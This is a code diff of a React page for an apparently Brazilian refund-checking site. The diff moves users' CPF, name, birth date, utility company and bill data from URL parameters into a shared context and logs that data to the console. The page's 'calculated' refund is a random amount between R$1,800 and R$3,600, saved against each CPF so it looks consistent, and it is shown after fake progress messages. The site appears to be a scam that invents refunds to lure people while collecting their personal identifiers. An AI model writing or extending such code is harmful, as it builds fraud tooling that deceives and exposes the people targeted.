@@ -6,10 +6,14 @@ import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/com
 import { Progress } from "@/components/ui/progress";
 import { useEffect, useState } from "react";
 import { useLocation } from "wouter";
+import { useUserData } from "@/contexts/UserContext";
 
 export default function ResultadoCalculo() {
   // Hook de navegação do wouter
   const [location, navigate] = useLocation();
+  
+  // Obter dados do contexto do usuário
+  const { userData, updateUserData } = useUserData();
   
   // Estado para controlar loading e progresso
   const [isLoading, setIsLoading] = useState(true);
@@ -18,14 +22,16 @@ export default function ResultadoCalculo() {
   
   // Estados para dados do resultado
   const [valorRestituicao, setValorRestituicao] = useState(0);
-  const [nome, setNome] = useState("");
-  const [cpf, setCpf] = useState("");
-  const [companhia, setCompanhia] = useState("");
-  const [estado, setEstado] = useState("");
-  const [dataNascimento, setDataNascimento] = useState("");
-  const [valorMedio, setValorMedio] = useState("");
-  const [meses, setMeses] = useState("");
   const [dataPrevista, setDataPrevista] = useState("");
+  
+  // Obter dados do usuário do contexto global
+  const nome = userData.nome || "";
+  const cpf = userData.cpf || "";
+  const companhia = userData.companhia || "";
+  const estado = userData.estado || "";
+  const dataNascimento = userData.dataNascimento || "";
+  const valorMedio = userData.valorConta?.toString() || "";
+  const meses = userData.periodo?.toString() || "";
   
   // Sequência de mensagens a serem exibidas durante o loading
   const mensagens = [
@@ -41,17 +47,11 @@ export default function ResultadoCalculo() {
     // Iniciar animação de loading imediatamente
     setIsLoading(true);
     
-    // Recupera parâmetros da URL
-    const searchParams = new URLSearchParams(window.location.search);
-    
-    // Preenche os estados com os parâmetros
-    setCpf(searchParams.get('cpf') || '');
-    setNome(searchParams.get('nome') || '');
-    setCompanhia(searchParams.get('companhia') || '');
-    setEstado(searchParams.get('estado') || '');
-    setDataNascimento(searchParams.get('nasc') || '');
-    setValorMedio(searchParams.get('valor') || '');
-    setMeses(searchParams.get('meses') || '');
+    // Verificar se temos os dados necessários no contexto
+    if (!cpf) {
+      navigate("/verificar");
+      return;
+    }
     
     // Definir a data prevista com 72h úteis (3 dias úteis)
     setDataPrevista(calcularDataPrevisao());
@@ -82,11 +82,19 @@ export default function ResultadoCalculo() {
       return intervalId;
     };
     
-    // Consultar API para obter valor de restituição (ou gerar um novo)
+    // Consultar API para obter valor de restituição (ou usar valor do contexto)
     const consultarValorRestituicao = async () => {
       try {
+        // Se já temos valor no contexto, usar ele diretamente
+        if (userData.valorRestituicao) {
+          console.log("Usando valor de restituição do contexto:", userData.valorRestituicao);
+          const valorEmCentavos = Math.round(parseFloat(userData.valorRestituicao.toString()) * 100);
+          setValorRestituicao(valorEmCentavos);
+          return;
+        }
+        
         // Limpar numeração do CPF
-        const cpfLimpo = searchParams.get('cpf')?.replace(/\D/g, '') || '';
+        const cpfLimpo = cpf.replace(/\D/g, '');
         
         // Consultar API
         const response = await fetch(`/api/restituicao?cpf=${cpfLimpo}`);
@@ -97,36 +105,63 @@ export default function ResultadoCalculo() {
           console.log("Valor encontrado no banco de dados:", data.valorRestituicao);
           const valorEmCentavos = Math.round(parseFloat(data.valorRestituicao) * 100);
           setValorRestituicao(valorEmCentavos);
-        } else {
-          // Gerar um novo valor (entre R$ 1.800,00 e R$ 3.600,00)
-          const valorMinimo = 180000;
-          const valorMaximo = 360000;
-          const valorAleatorio = Math.floor(Math.random() * (valorMaximo - valorMinimo + 1)) + valorMinimo;
-          setValorRestituicao(valorAleatorio);
           
-          // Salvar o valor no banco de dados para consultas futuras
-          try {
-            await fetch('/api/restituicao', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json',
-              },
-              body: JSON.stringify({
-                cpf: cpfLimpo,
-                valor: valorAleatorio / 100 // Converter de centavos para real
-              }),
+          // Atualizar o contexto com o valor
+          updateUserData({
+            valorRestituicao: data.valorRestituicao
+          });
+        } else {
+          // Usar valor do contexto ou gerar um novo
+          const valorRestituicaoExistente = userData.valorRestituicao;
+          
+          if (valorRestituicaoExistente) {
+            const valorEmCentavos = Math.round(parseFloat(valorRestituicaoExistente.toString()) * 100);
+            setValorRestituicao(valorEmCentavos);
+          } else {
+            // Gerar um novo valor (entre R$ 1.800,00 e R$ 3.600,00)
+            const valorMinimo = 180000;
+            const valorMaximo = 360000;
+            const valorAleatorio = Math.floor(Math.random() * (valorMaximo - valorMinimo + 1)) + valorMinimo;
+            setValorRestituicao(valorAleatorio);
+            
+            // Atualizar o contexto global com esse valor
+            updateUserData({
+              valorRestituicao: valorAleatorio / 100
             });
-            console.log("Valor salvo no banco de dados com sucesso");
-          } catch (error) {
-            console.error("Erro ao salvar valor no banco de dados:", error);
+            
+            // Salvar o valor no banco de dados para consultas futuras
+            try {
+              await fetch('/api/restituicao', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  cpf: cpfLimpo,
+                  valor: valorAleatorio / 100 // Converter de centavos para real
+                }),
+              });
+              console.log("Valor salvo no banco de dados com sucesso");
+            } catch (error) {
+              console.error("Erro ao salvar valor no banco de dados:", error);
+            }
           }
         }
       } catch (error) {
         console.error("Erro ao consultar/gerar valor de restituição:", error);
         
-        // Em caso de erro, usar um valor padrão
-        const valorPadrao = 250000; // R$ 2.500,00
-        setValorRestituicao(valorPadrao);
+        // Em caso de erro, usar um valor padrão ou o do contexto
+        if (userData.valorRestituicao) {
+          const valorEmCentavos = Math.round(parseFloat(userData.valorRestituicao.toString()) * 100);
+          setValorRestituicao(valorEmCentavos);
+        } else {
+          const valorPadrao = 250000; // R$ 2.500,00
+          setValorRestituicao(valorPadrao);
+          // Atualizar contexto
+          updateUserData({
+            valorRestituicao: valorPadrao / 100
+          });
+        }
       }
     };
     
@@ -138,7 +173,7 @@ export default function ResultadoCalculo() {
     
     // Limpar intervalo quando o componente for desmontado
     return () => clearInterval(intervalId);
-  }, []);
+  }, [cpf, userData, updateUserData, navigate]);
   
   // Formatar CPF
   const formatarCPF = (cpf: string) => {
@@ -201,11 +236,25 @@ export default function ResultadoCalculo() {
   
   // Redirecionar para a página de confirmação de forma mais rápida
   const prosseguirParaConfirmacao = () => {
-    // Criar URL com parâmetros
-    const url = `/confirmacao-restituicao?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedio)}&meses=${encodeURIComponent(meses)}&data_prevista=${encodeURIComponent(dataPrevista)}`;
+    // Atualizar contexto com a data prevista antes de navegar
+    updateUserData({
+      dataPrevista: dataPrevista
+    });
     
-    // Usar navigate da wouter para navegação mais eficiente (sem recarregar a página)
-    navigate(url);
+    // Verificar no console os dados que serão passados para a próxima página
+    console.log("Dados do usuário que serão passados para confirmação:", {
+      cpf,
+      nome,
+      valorRestituicao,
+      companhia,
+      estado,
+      dataNascimento,
+      meses,
+      dataPrevista
+    });
+    
+    // Navegar diretamente para a página de confirmação sem parâmetros na URL
+    navigate("/confirmacao-restituicao");
   };
   
   return (
